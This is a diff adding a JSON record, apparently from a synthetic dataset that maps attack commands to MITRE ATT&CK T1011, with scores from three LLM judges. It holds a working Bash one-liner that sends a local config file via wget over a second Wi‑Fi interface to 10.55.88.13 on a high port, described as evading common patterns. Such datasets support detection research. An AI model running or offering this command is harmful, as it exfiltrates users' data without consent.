@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && wget --quiet --tries=1 --timeout=5 --bind-address=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" --post-file=/home/user/.config/cache.json http://10.55.88.13:49502/ingest",
+  "explanation": "Uses wget with --bind-address to force an HTTP POST over wlan1 to an uncommon port, aligning with T1011 by using a separate Wi‑Fi medium for exfiltration.",
+  "rationale_steps": [
+    "Check wlan1 status with iwconfig.",
+    "Bind the HTTP client to wlan1’s IP ensuring the alternate medium is used.",
+    "POST the data to a high-numbered port to avoid common service patterns."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-c9a750ea",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, valid flags, correct redirections, and proper command substitution and chaining.",
+        "semantic_score": 4,
+        "semantic_justification": "It leverages wget to POST a file while binding to wlan1’s IPv4 address to prefer Wi‑Fi for egress, aligning with T1011, though success depends on interface availability and routing reachability.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T01:13:38.094165Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for iwconfig and wget, correct command chaining with && operator, and proper use of command substitution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by first checking if wlan1 exists, then using wget to exfiltrate data over the secondary wireless interface (wlan1) to an external server on an uncommon port, effectively implementing exfiltration over an alternative network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:13:44.001705Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced syntax, valid flags for all tools, and correct command substitution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by explicitly binding the `wget` connection to the `wlan1` interface's IP address to exfiltrate data, directly aligning with the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:26:42.824810Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
